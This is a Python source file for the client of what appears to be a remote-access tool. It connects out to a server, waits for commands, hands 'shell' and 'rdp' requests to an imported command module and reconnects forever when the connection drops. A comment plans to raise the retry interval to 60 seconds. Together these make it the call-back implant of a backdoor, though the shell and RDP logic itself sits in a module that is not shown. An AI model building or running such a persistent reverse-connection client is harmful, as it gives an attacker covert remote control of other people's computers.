import socket
from client_folder.tools import Commands
from time import sleep

BUFFER_SIZE = 1024


class Client:
    def __init__(self, ip, port):
        """ This will initiate the connection to the server """
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((ip, port))
        print('Connected successfully to the server')

    def close(self):
        """ Closes the connection to the server """
        self.client_socket.close()

    def send(self, message):
        """ Sends a message in small chunks to the server 
            Parameters:
                message (bytes\str): Message to send the server """
        message = message.encode() if type(message) != bytes else message
        while message:
            self.client_socket.send(message[:BUFFER_SIZE])
            message = message[BUFFER_SIZE:]

    def receive(self, as_bytes=False):
        """ Recieve a message in small chunks from the server
            Parameters:
                as_bytes (bool): If set to True, this function will return the data as bytes. Default=False """
        chunk = self.client_socket.recv(BUFFER_SIZE)
        data = chunk
        while len(chunk) == BUFFER_SIZE:
            chunk = self.client_socket.recv(BUFFER_SIZE)
            data += chunk
        return data if as_bytes else data.decode()


def main():
    client = Client('127.0.0.1', 8000)
    command_menu = Commands(client)
    while True:
        try:
            while True:
                cmd = client.receive()
                if cmd == 'shell':
                    command_menu.shell()
                elif cmd == 'rdp':
                    command_menu.rdp()
                else:
                    client.send('[!] Unconfigured option')
                    break
        except socket.error:
            print('Connection lost... Trying to reconnect...')
            sleep(3) # Auto re-connect CHANGE TO 60 SEC and put in a const
            main()



if __name__ == "__main__":
    main()
